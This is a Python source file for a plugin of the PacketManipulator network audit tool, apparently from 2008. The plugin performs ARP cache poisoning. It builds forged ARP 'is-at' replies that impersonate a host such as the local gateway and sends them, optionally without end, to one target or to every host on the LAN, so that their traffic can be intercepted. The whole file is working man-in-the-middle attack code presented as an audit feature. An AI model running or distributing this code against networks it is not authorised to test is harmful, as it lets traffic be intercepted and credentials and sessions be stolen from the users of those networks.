#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (C) 2008 Adriano Monteiro Marques
#
# Author: Francesco Piccinno <stack.box@gmail.com>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

import gtk

import time
from socket import gethostbyname

from PM.Core.I18N import _
from PM.Core.Logger import log
from PM.Core.AuditUtils import is_ip, is_mac

from PM.Gui.Core.App import PMApp
from PM.Gui.Plugins.Core import Core
from PM.Gui.Plugins.Engine import Plugin
from PM.Manager.AuditManager import *

from PM.Backend import MetaPacket

class ARPCachePoison(Plugin, ActiveAudit):
    __inputs__ = (
        ('host', ('0.0.0.0', _('The host you wish to intercept packets for'
                             ' (usually the local gateway)'))),
        ('target', ('0.0.0.0', _('Optional: IP address of a particular host '
                                 'to ARP poison. (if not specified, all the '
                                 'hosts on the LAN)'))),
        ('hwsrc', ('', _('The source MAC address (leave it empty and will be '
                         'automatically filled with the MAC of your NIC'))),
        ('packets', (0, _('Number of packets to send. 0 for infinite'))),
        ('delay', (300, _('Delay in msec between consecutive sends'))),
    )

    def start(self, reader):
        self.status = PMApp().main_window.get_tab('StatusTab').status

        a, self.item = self.add_menu_entry('ARPPoison', 'ARP cache poisoning ...',
                                           _('Poison the ARP cache of an host.'),
                                           gtk.STOCK_EXECUTE)

    def stop(self):
        self.remove_menu_entry(self.item)

    def on_resolved(self, send, mpkt, reply, udata):
        hwdst = reply.get_field('arp.hwsrc')
        sess, host, target, hwsrc, packets, delay = udata

        self.status.info(_('IP %s is-at %s') % (reply.get_field('arp.pdst'), hwsrc))

        self.poison(sess, host, target, hwsrc, hwdst, packets, delay)

    def on_error(self, send, status, udata):
        if udata:
            self.status.warning(_('Unable to resolve %s (Errno: %d)') \
                                % (send.mpkts[0].get_field('arp.pdst'), status))

    def execute_audit(self, sess, inp_dict):
        host = inp_dict['host']
        hwsrc = inp_dict['hwsrc']
        target = inp_dict['target']
        packets = inp_dict['packets']
        delay = max(300, inp_dict['delay'])

        if packets <= 0:
            packets = -1

        if not is_ip(host):
            self.status.error(_('Not a valid IP address for host'))
            return False

        if not is_ip(target):
            self.status.error(_('Not a valid IP address for target'))
            return False

        if hwsrc and not is_mac(hwsrc):
            self.status.error(_('Not a valid MAC address for hwsrc'))
            return False

        if target != '0.0.0.0':
            # We have to solve the IP as MAC address
            pkt = MetaPacket.new('arp')

            pkt.set_field('arp.pdst', target)

            sess.context.sr_l3(pkt, timeout=4,
                               onerror=self.on_error,
                               onreply=self.on_resolved,
                               udata=(sess, host, target, hwsrc, packets, delay))

            self.status.info(_('Trying to resolve IP: %s') % target)
        else:
            self.poison(sess, host, target, hwsrc, '', packets, delay)

        return True

    def poison(self, sess, host, target, hwsrc, hwdst, packets, delay):
        pkt = MetaPacket.new('eth') / MetaPacket.new('arp')

        if hwdst:
            pkt.set_field('eth.dst', hwdst)
            pkt.set_field('arp.hwdst', hwdst)
        else:
            pkt.set_field('arp.hwdst', 'ff:ff:ff:ff:ff:ff')

        pkt.set_field('arp.op', 'is-at')
        pkt.set_field('arp.psrc', host)
        pkt.set_field('arp.pdst', target)

        if hwsrc:
            pkt.set_field('arp.hwsrc', hwsrc)

        self.status.info(_('Starting ARP cache poison against %s '
                           '(capturing packets directed to %s)') % (target, host))

        send = sess.context.s_l2(pkt, repeat=packets, delay=delay)

__plugins__ = [ARPCachePoison]
__plugins_deps__ = []

__audit_type__ = 1
__protocols__ = (('arp', None), )

